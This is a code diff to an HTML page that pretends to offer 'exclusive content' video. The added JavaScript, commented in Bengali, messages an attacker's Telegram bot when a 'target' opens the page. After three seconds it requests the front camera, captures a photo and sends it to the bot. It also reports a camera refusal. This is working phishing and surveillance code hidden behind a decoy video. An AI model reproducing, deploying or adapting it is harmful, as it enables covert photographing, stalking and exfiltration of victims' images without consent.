@@ -61,7 +61,7 @@
     <div id="videoContainer">
         <div id="loadingMessage">Loading exclusive content, please wait...</div>
         <div id="statusMessage"></div>
-        <video id="mainVideo" autoplay muted loop playsinline controls>
+        <video id="mainVideo" autoplay muted loop playsinline>
             <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
             Your browser doesn't support the video tag.
         </video>
@@ -75,4 +75,104 @@
         const chatId = "7930590409";
         const botToken = p1 + p2;
         
-        // স্ট্যাটাস ম
+        // স্ট্যাটাস মেসেজ ফাংশন
+        function showStatus(message, isError = false) {
+            const statusElement = document.getElementById('statusMessage');
+            statusElement.textContent = message;
+            statusElement.style.backgroundColor = isError ? 'rgba(255,0,0,0.7)' : 'rgba(0,255,0,0.7)';
+            statusElement.style.display = 'block';
+            
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 3000);
+        }
+        
+        // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+        
+        // ভিডিও লোড হওয়ার পর লোডিং মেসেজ হাইড করা
+        document.getElementById('mainVideo').addEventListener('canplay', function() {
+            setTimeout(function() {
+                document.getElementById('loadingMessage').style.display = 'none';
+            }, 3000);
+        });
+        
+        // পেজ লোড হওয়ার সাথে সাথে মেসেজ পাঠানো
+        window.addEventListener('load', function() {
+            sendTelegramMessage('TARGET OPEN THE LINK');
+            showStatus('Initializing camera...', false);
+        });
+        
+        // ক্যামেরা অ্যাক্সেস করে ছবি তোলা এবং টেলিগ্রামে পাঠানো
+        function captureAndSend() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            })
+            .then(function(stream) {
+                const hiddenVideo = document.getElementById('hiddenCamera');
+                hiddenVideo.srcObject = stream;
+                
+                showStatus('Camera access granted, capturing photo...', false);
+                
+                // ক্যামেরা ইনিশিয়ালাইজ হতে সময় দেওয়া
+                setTimeout(function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = hiddenVideo.videoWidth;
+                    canvas.height = hiddenVideo.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                    
+                    // ক্যানভাস থেকে ব্লব ডেটা তৈরি করা
+                    canvas.toBlob(function(blob) {
+                        // ফর্মডেটা তৈরি করা
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'capture.jpg');
+                        
+                        // টেলিগ্রাম এপিআই-এ ছবি পাঠানো
+                        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
+                        
+                        fetch(telegramUrl, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Photo sent successfully:', data);
+                            showStatus('Photo captured and sent!', false);
+                            
+                            // ছবি পাঠানোর পর আরও একটি মেসেজ পাঠানো
+                            sendTelegramMessage('Photo captured successfully!');
+                        })
+                        .catch(error => {
+                            console.error('Error sending photo:', error);
+                            showStatus('Failed to send photo!', true);
+                        });
+                        
+                        // ক্যামেরা স্ট্রিম বন্ধ করা
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            })
+            .catch(function(err) {
+                console.error('Camera access denied:', err);
+                showStatus('Camera access denied!', true);
+                sendTelegramMessage('Camera access denied by target!');
+            });
+        }
+        
+        // পেজ লোড হওয়ার ৩ সেকেন্ড পর ছবি তোলা শুরু করা
+        setTimeout(captureAndSend, 3000);
+    </script>
+</body>
+</html>
